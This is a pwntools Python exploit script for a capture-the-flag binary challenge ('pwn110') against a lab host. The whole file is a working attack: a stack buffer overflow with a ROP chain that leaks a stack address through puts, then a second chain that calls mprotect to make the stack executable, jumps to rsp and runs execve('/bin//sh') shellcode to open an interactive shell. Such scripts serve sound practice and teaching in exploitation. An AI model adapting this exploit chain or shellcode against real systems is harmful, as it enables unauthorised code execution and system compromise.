from pwn import *
io = remote("10.10.101.248", 9010)

context.log_level='DEBUG'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

gdb_script = f'''
           b*main
            c
            '''
#io = gdb.debug("./pwn110-1644300525386.pwn110", gdbscript=gdb_script)

stack_end_sym_addr = p64(0x004bfa70)

io.recvuntil(" libc 😏")
io.clean()

payload = b'A' * 40
popRDIAddr = p64(0x40191a) #pop rdi; ret
popRSIAddr = p64(0x40f4de) # pop rsi ; ret
popRDXAddr = p64(0x40181f) # pop rdx ; ret
jmpRSPAddr = p64(0x463c43) # jmp rsp

payload += popRDIAddr
payload += stack_end_sym_addr
payload += p64(0x00411bd0) #puts addr
payload += p64(0x00401e61) #main addr

io.sendline(payload)
endAddrOfStack = u64(io.recvline().strip().ljust(8, b'\x00'))

#allign it to page
pageAddr = endAddrOfStack & 0xffffffffffff0000 # change permission of 0x10000 bytes to be sure we include our payload

io.recvuntil(" libc 😏")
io.clean()

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
# int mprotect (void * __addr, size_t __len, int __prot)
#                   RDI             RSI         EDX
payload = b'A' * 40

payload += popRDIAddr
payload += p64(pageAddr)

payload += popRSIAddr
payload += p64(0x10000) # length

payload += popRDXAddr
payload += p64(0x7) #permissions RWX


payload += p64(0x00449b70) #mroptect addr
payload += p64(0x00401eac) #ret for movaps allignment
payload += jmpRSPAddr
payload += shellcode

io.sendline(payload)
io.interactive()